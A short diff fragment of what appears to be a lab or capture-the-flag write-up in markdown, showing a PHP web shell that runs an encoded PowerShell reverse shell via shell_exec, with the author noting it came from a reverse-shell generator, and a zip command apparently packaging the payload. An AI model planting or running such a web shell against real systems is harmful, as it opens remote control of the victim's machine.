@@ -195,7 +195,7 @@ shell_exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC
 ?>
 ```
 
-This is the contents of shell.php, i just gr
+This is the contents of shell.php, i just grabbed the powershell base64 shell from revshells
 
 ```python
 ❯❯❯ zip -r default.zip default.pdf                                                   
